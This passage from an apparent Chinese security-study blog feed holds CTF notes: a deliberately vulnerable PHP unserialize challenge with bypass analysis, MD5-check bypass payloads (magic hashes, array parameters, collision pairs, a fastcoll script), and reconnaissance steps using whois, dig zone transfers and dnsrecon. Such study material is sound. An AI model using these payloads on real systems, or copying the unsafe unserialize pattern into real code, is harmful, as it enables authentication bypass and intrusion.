class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//process()方法中，使用弱类型比较==比较op的值是否对等于“2”，若为真，则执行read()方法与output()方法。</span><br><span class="line"></span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);//读取属性filename路径的文件   //file_get_content()可以读取php://filter伪协议</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">//构析函数中，op使用强类型比较===判断this-&gt;op的值是否等于“2”，如果等于，则将其置为“1”。执行process()方法。</span><br><span class="line">&#125;</span><br><span class="line">//该段代码通过get方法获得字符串str，若str中没有不可打印的字符串后，对字符串执行反序列化操作</span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">//is_valid()函数对传入的字符串进行判断，确保每个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true</span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过上面对一些函数的分析可知：</p><p>1、我们要绕过process()函数里的弱比较op&#x3D;&#x3D;”2”，绕过方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op=2，这里的2是整型int类型，op===&quot;2&quot;为false，op==&quot;2&quot;为true</span><br></pre></td></tr></table></figure><p>2、is_valid()函数规定字符的ASCII码必须是32-125，而private&#x2F;protected属性在序列化后会出现不可见字符 <code>\00*\00</code>，转化为ASCII码不符合要求，而public类型则不会。</p><p>绕过方法：PHP7.1以上版本对属性类型不敏感，Public属性序列化不会出现不可见符，可以用public属性来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础---MD5（）函数的漏洞</title>
      <link href="/2021/12/03/MD5%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2021/12/03/MD5%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="MD5（）函数的漏洞总结"><a href="#MD5（）函数的漏洞总结" class="headerlink" title="MD5（）函数的漏洞总结"></a>MD5（）函数的漏洞总结</h2><h4 id="1、md5-pass-true"><a href="#1、md5-pass-true" class="headerlink" title="1、md5($pass,true)"></a>1、md5($pass,true)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="2、“0E”绕过"><a href="#2、“0E”绕过" class="headerlink" title="2、“0E”绕过"></a>2、“0E”绕过</h4><p>形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;a&#x27;]!=$_GET[&#x27;b&#x27;]</span><br><span class="line">MD5($_GET[&#x27;a&#x27;])==MD5($_GET[&#x27;b&#x27;])</span><br></pre></td></tr></table></figure><p>要求a和b数值不同但MD5相同，PHP在处理字符串时，它把每一个“0E”开头的哈希值都解释为0。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">240610708 </span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">314282422 </span><br><span class="line">0e990995504821699494520356953734</span><br><span class="line">571579406 </span><br><span class="line">0e972379832854295224118025748221</span><br><span class="line">903251147 </span><br><span class="line">0e174510503823932942361353209384</span><br><span class="line">1110242161 </span><br><span class="line">0e435874558488625891324861198103</span><br><span class="line">1320830526 </span><br><span class="line">0e912095958985483346995414060832</span><br><span class="line">1586264293 </span><br><span class="line">0e622743671155995737639662718498</span><br><span class="line">2302756269 </span><br><span class="line">0e250566888497473798724426794462</span><br><span class="line">2427435592 </span><br><span class="line">0e067696952328669732475498472343</span><br><span class="line">2653531602 </span><br><span class="line">0e877487522341544758028810610885</span><br><span class="line">3293867441 </span><br><span class="line">0e471001201303602543921144570260</span><br><span class="line">3295421201 </span><br><span class="line">0e703870333002232681239618856220</span><br><span class="line">3465814713 </span><br><span class="line">0e258631645650999664521705537122</span><br><span class="line">3524854780 </span><br><span class="line">0e507419062489887827087815735195</span><br><span class="line">3908336290 </span><br><span class="line">0e807624498959190415881248245271</span><br><span class="line">4011627063 </span><br><span class="line">0e485805687034439905938362701775</span><br><span class="line">4775635065 </span><br><span class="line">0e998212089946640967599450361168</span><br><span class="line">4790555361 </span><br><span class="line">0e643442214660994430134492464512</span><br><span class="line">5432453531 </span><br><span class="line">0e512318699085881630861890526097</span><br><span class="line">5579679820 </span><br><span class="line">0e877622011730221803461740184915</span><br><span class="line">5585393579 </span><br><span class="line">0e664357355382305805992765337023</span><br><span class="line">6376552501 </span><br><span class="line">0e165886706997482187870215578015</span><br><span class="line">7124129977 </span><br><span class="line">0e500007361044747804682122060876</span><br><span class="line">7197546197 </span><br><span class="line">0e915188576072469101457315675502</span><br><span class="line">7656486157 </span><br><span class="line">0e451569119711843337267091732412</span><br><span class="line">QLTHNDT </span><br><span class="line">0e405967825401955372549139051580</span><br><span class="line">QNKCDZO </span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">EEIZDOI </span><br><span class="line">0e782601363539291779881938479162</span><br><span class="line">TUFEPMC </span><br><span class="line">0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ </span><br><span class="line">0e382098788231234954670291303879</span><br><span class="line">UYXFLOI </span><br><span class="line">0e552539585246568817348686838809</span><br><span class="line">IHKFRNS </span><br><span class="line">0e256160682445802696926137988570</span><br><span class="line">PJNPDWY </span><br><span class="line">0e291529052894702774557631701704</span><br><span class="line">ABJIHVY </span><br><span class="line">0e755264355178451322893275696586</span><br><span class="line">DQWRASX </span><br><span class="line">0e742373665639232907775599582643</span><br><span class="line">DYAXWCA </span><br><span class="line">0e424759758842488633464374063001</span><br><span class="line">GEGHBXL </span><br><span class="line">0e248776895502908863709684713578</span><br><span class="line">GGHMVOE </span><br><span class="line">0e362766013028313274586933780773</span><br><span class="line">GZECLQZ </span><br><span class="line">0e537612333747236407713628225676</span><br><span class="line">NWWKITQ </span><br><span class="line">0e763082070976038347657360817689</span><br><span class="line">NOOPCJF </span><br><span class="line">0e818888003657176127862245791911</span><br><span class="line">MAUXXQC </span><br><span class="line">0e478478466848439040434801845361</span><br><span class="line">MMHUWUV </span><br><span class="line">0e701732711630150438129209816536</span><br></pre></td></tr></table></figure><p>例如:<code>a=QNKCDZO&amp;b=240610708</code></p><h4 id="3、数组绕过"><a href="#3、数组绕过" class="headerlink" title="3、数组绕过"></a>3、数组绕过</h4><p>形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;])</span><br></pre></td></tr></table></figure><p>在php中&#x3D;&#x3D;&#x3D;为完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure><h4 id="4、强类型（MD5碰撞）"><a href="#4、强类型（MD5碰撞）" class="headerlink" title="4、强类型（MD5碰撞）"></a>4、强类型（MD5碰撞）</h4><p>形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(string)$_POST[&#x27;a&#x27;]!==(string)$_POST[&#x27;b&#x27;]&amp;&amp;md5($_POST[&#x27;a&#x27;])===md5($_POST[&#x27;b&#x27;])</span><br></pre></td></tr></table></figure><p>这个和数组绕过的区别就是传入的最后转为字符串比较，所以数组就不行了。只能构造<strong>两个MD5值相同的不同字符串</strong></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一组：</span><br><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line">第二组：</span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>工具解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o a.txt b.txt</span><br></pre></td></tr></table></figure><p>生成a.txt和b.txt，将其转化为url编码提交，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># encoding=utf-8</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">file1 = open(&quot;a.txt&quot;, &quot;rb&quot;)</span><br><span class="line">file2 = open(&quot;b.txt&quot;, &quot;rb&quot;)</span><br><span class="line">res1 = file1.read()</span><br><span class="line">res2 = file2.read()</span><br><span class="line">s1 = urllib.quote(res1)</span><br><span class="line">s2 = urllib.quote(res2)</span><br><span class="line">file1.close()</span><br><span class="line">file2.close()</span><br><span class="line">print &#x27;a=%s&#x27;% s1 +&#x27;&amp;&#x27;+&#x27;b=%s&#x27;% s2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web渗透---信息收集方式</title>
      <link href="/2021/09/18/Web%E6%B8%97%E9%80%8F/"/>
      <url>/2021/09/18/Web%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="web渗透—信息收集方式"><a href="#web渗透—信息收集方式" class="headerlink" title="web渗透—信息收集方式"></a>web渗透—信息收集方式</h2><p>Web架构安全分析</p><h4 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /admin_s3cr3t.php HTTP/1.1</span><br><span class="line">Host: web.jarvisoj.com:32792</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: admin=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><span id="more"></span><p>由请求行、请求头、请求正文三部分组成</p><p>​    1、请求行：方法（GET&#x2F;POST），资源路径，协议&#x2F;版本</p><p>​     2、请求头     </p><p>​          第二行开始到第一个空行为止的所有内容，其中包含了很多字段  </p><p>​          <strong>主要字段</strong>：</p><p>​              HOST    被请求资源的Internet主机和端口号</p><p>​              User-Agent    浏览器指纹</p><p>​              Referer   包含一个URL，代表当前URL上一个URL（即从那个页面跳转过来的）</p><p>​              Cookie   记录请求者的身份认证信息</p><p>​              Content-Type    类型</p><p>​              Content-Length    正文长度</p><p>​     3、请求正文</p><h4 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 18 Sep 2021 15:54:17 GMT</span><br><span class="line">Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3</span><br><span class="line">X-Powered-By: PHP/5.6.21</span><br><span class="line">Set-Cookie: admin=0</span><br><span class="line">Content-Length: 21</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>响应报文：由状态行、响应头、响应正文三部分组成</p><p>​      <strong>1、状态行：</strong>协议&#x2F;版本（HTTP&#x2F;1.1），状态代码（200），描述短语（OK）</p><p>​        —几种类型状态码：信息提示  -1xx  、 成功 -2xx  、重定向 -3xx  、 客户端错误 -4xx 、服务器错误 -5xx  </p><p>​       <strong>2、响应报头</strong></p><p>​         第二行开始到第一个空行为止的所有内容，其中包含了关于HTTP响应的重要字段。（如上面那个段响应除去第一行其余为响应头</p><p>​        主要字段：</p><p>​                Server  服务器指纹</p><p>​                Set-Cookie    向浏览器端设置Cookie         </p><p>​                Last-Modified    服务器告诉浏览器资源最后修改时间</p><p>​                Content-Length   正文的长度</p><p>​                Location     重定向目标页面</p><p>​        <strong>3、响应正文</strong></p><p>​         服务器返回资源的内容，即浏览器接收到的HTML代码</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="收集DNS"><a href="#收集DNS" class="headerlink" title="收集DNS"></a>收集DNS</h3><p>主要关注域名注册商，管理员联系方式，电话和邮箱，子域名等信息</p><p><strong>DNS的资源记录</strong></p><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><em><strong>A记录</strong></em></td><td>“主机名称”与“IP”地址的对应关系，把名称转换成IP地址</td></tr><tr><td>MX记录</td><td>记录提供邮件路由信息，提供网域的“邮件交换器”的主机名称以及相对应的优先值</td></tr><tr><td>NS记录</td><td>域名解析服务器记录，如果子域名需要指定某个域名服务器来解析，要设置NS记录</td></tr><tr><td>CNAME记录</td><td>记录代表别名（某些名称并没有对应的IP地址，只是主机名的别名）与规范主机名称之间的对应关系</td></tr></tbody></table><h4 id="—-whois查询"><a href="#—-whois查询" class="headerlink" title="—　whois查询"></a><strong>—　whois查询</strong></h4><p>​     whois工具可以用来查询域名注册信息</p><p>​      语法：whois domian(域名)</p><p>​     除了whois查询，还可以进行反查（通过站长之家进行whois查询 <a href>http://whois.chinaz.com</a> ，例如：邮箱反查、注册人反查、电话反查</p><h4 id="—-子域名查询"><a href="#—-子域名查询" class="headerlink" title="—   子域名查询"></a><strong>—   子域名查询</strong></h4><p>​      1、可以查询子域名的网站[<a href="https://searchdns.netcraft.com/]">https://searchdns.netcraft.com/]</a></p><p>​      2、  <strong>域传送漏洞</strong></p><p>​     DNS区域传送 (DNS zone transfer) 指的是一台备用服务器使用来自主服务器的数据刷新自己的域数据库，为运行中的DNS服务提供了一定的冗余度，目的是为了防止主服务器因意外故障不可用时影响整个域名的解析。</p><p>​     DNS区域传送操作只在网络里真有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求（且不需要身份认证），就会向对方提供一个域数据库的详细信息</p><p>​     使用dig工具来检测域传送漏洞，命令：dig axfr @dns.example.com example.com</p><p>​                                                                     ＠指定一个DNS服务器　域名</p><img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/1.png" style="zoom:50%;"><p>  通过域传送漏洞可得到：子域名信息、子域名对应的IP地址</p><p>​      3、子域名爆破（子域名挖掘机）</p><p>​       准备一个工具里面写上所有可能的域名（4个字母左右别超过10个）。工具重要，重要的是字典（dic）</p><p>​    <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/2.png"></p><p>​      4、子域名枚举（爆破）</p><p>​       工具：dnsrecon</p><p>​      <strong>常用命令</strong></p><p>   <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/3.png" style="zoom:50%;">     <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/4.png"></p><p>​    <strong>实验：</strong></p><p>　　由于不知道dnsrecon自带的字典的路径</p><p>  <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/5.png"></p><p>​       下面可进行创建自己的字典  <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/6.png"></p><p>​        字典内容：</p><img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/7.png" style="zoom:50%;"><p>​       子域名查询</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语法： dnsrecon -d vulnweb.com -D usr/share/dnsrecon/dic/dns.dic -t brt</span><br><span class="line"></span><br><span class="line">               -d  域名        -D  选字典                         -t 选模式</span><br></pre></td></tr></table></figure>  <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/8.png" style="zoom: 80%;"><h3 id="DNS２IP-通过DNS解析找到IP地址"><a href="#DNS２IP-通过DNS解析找到IP地址" class="headerlink" title="DNS２IP(通过DNS解析找到IP地址)"></a>DNS２IP(通过DNS解析找到IP地址)</h3><h4 id="—-ping（非权威解答）"><a href="#—-ping（非权威解答）" class="headerlink" title="— ping（非权威解答）"></a>— ping（非权威解答）</h4><p>命令：ping   testfire.net         (ping + 域名)</p><p>​            得IP地址为65.61.137.117</p><h4 id="—-nslookup（非权威解答）"><a href="#—-nslookup（非权威解答）" class="headerlink" title="— nslookup（非权威解答）"></a>— 